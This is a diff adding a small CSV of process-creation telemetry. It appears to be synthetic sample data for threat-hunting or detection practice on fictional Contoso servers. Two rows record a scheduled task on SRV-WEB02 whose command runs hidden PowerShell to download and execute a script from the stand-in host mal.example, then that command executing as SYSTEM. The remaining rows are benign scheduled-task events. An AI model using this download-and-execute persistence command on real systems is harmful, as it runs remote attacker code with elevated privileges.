@@ -1,0 +1,6 @@
+TimeGenerated,DeviceName,InitiatingProcessFileName,ProcessCommandLine,ProcessId,ParentProcessFileName,InitiatingProcessAccountName,ReportId
+2025-10-22T02:33:31Z,SRV-WEB02,schtasks.exe,"schtasks /Create /SC ONCE /TN ""\Contoso\Updater"" /TR ""powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://mal.example/a.ps1')"" /ST 12:00",4520,cmd.exe,CONTOSO\svc-admin,rpt-1001
+2025-10-22T04:03:31Z,SRV-WEB02,powershell.exe,"powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(""http://mal.example/a.ps1"")",4628,taskeng.exe,NT AUTHORITY\SYSTEM,rpt-1002
+2025-10-22T02:19:31Z,SRV-APP01,schtasks.exe,"schtasks /Create /TN ""\Microsoft\Windows\Defrag\ScheduledDefrag"" /TR ""defrag.exe""",3300,services.exe,SYSTEM,rpt-1003
+2025-10-22T02:48:31Z,SRV-BACKUP01,schtasks.exe,"schtasks /Delete /TN ""\Contoso\OldBackup"" /F",3780,cmd.exe,CONTOSO\backupsvc,rpt-1004
+2025-10-22T04:44:31Z,SRV-DB01,taskschd.msc,taskschd.msc,5021,mmc.exe,CONTOSO\itops,rpt-1005
